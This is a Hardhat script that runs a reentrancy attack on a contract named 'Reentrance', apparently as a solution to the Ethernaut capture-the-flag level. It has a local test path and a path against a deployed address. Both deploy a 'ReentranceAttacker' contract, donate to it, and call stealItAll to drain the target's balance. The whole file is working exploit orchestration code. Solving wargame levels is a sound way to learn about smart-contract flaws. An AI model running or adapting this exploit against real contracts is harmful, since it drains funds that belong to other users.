import { ethers } from "hardhat";

// Run on localhost
async function handleTest() {
  const [me] = await ethers.getSigners();

  const reentranceFactory = await ethers.getContractFactory("Reentrance");
  const reentrance = await reentranceFactory.deploy();

  const reentranceAddress = await reentrance.getAddress();

  const reentranceAttackerFactory = await ethers.getContractFactory(
    "ReentranceAttacker"
  );
  const reentranceAttacker = await reentranceAttackerFactory.deploy(
    reentranceAddress
  );

  const reentranceAttackerAddress = await reentranceAttacker.getAddress();

  await reentrance.donate(me.address, { value: ethers.parseEther("10") });

  console.log(
    "Reentrance balance:",
    ethers.formatEther(await ethers.provider.getBalance(reentranceAddress))
  );

  await reentrance.donate(reentranceAttackerAddress, {
    value: ethers.parseEther("1"),
  });

  await reentranceAttacker.stealItAll(ethers.parseEther("1"));

  console.log(
    "New reentrance balance:",
    ethers.formatEther(await ethers.provider.getBalance(reentranceAddress))
  );

  console.log(
    "Attacker balance:",
    ethers.formatEther(
      await ethers.provider.getBalance(reentranceAttackerAddress)
    )
  );
}

async function handleReal() {
  const reentrance = await ethers.getContractAt(
    "Reentrance",
    "0xea9bB71dD3B411AaCC02e85B4A492b49905D0B77"
  );

  const reentranceAttackerFactory = await ethers.getContractFactory(
    "ReentranceAttacker"
  );
  const reentranceAddress = await reentrance.getAddress();

  const reentranceAttacker = await reentranceAttackerFactory.deploy(
    reentranceAddress
  );

  //   const reentranceAttacker = await ethers.getContractAt(
  //     "ReentranceAttacker",
  //     "0x3147c2be3F4c2DeC68c69405AAd6e98a4bFDDB18"
  //   );

  const reentranceAttackerAddress = await reentranceAttacker.getAddress();

  console.log(
    "Reentrance start balance:",
    ethers.formatEther(await ethers.provider.getBalance(reentranceAddress))
  );

  await reentrance.donate(reentranceAttackerAddress, {
    value: ethers.parseEther("0.0001"),
  });

  console.log(
    "ReentranceAttacker balanceOf balance:",
    ethers.formatEther(await reentrance.balanceOf(reentranceAttackerAddress))
  );

  await reentranceAttacker.stealItAll(ethers.parseEther("0.0001"), {
    gasLimit: 200000,
  });

  console.log(
    "Reentrance end balance:",
    ethers.formatEther(await ethers.provider.getBalance(reentranceAddress))
  );

  console.log(
    "Attacker balance:",
    ethers.formatEther(
      await ethers.provider.getBalance(reentranceAttackerAddress)
    )
  );
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
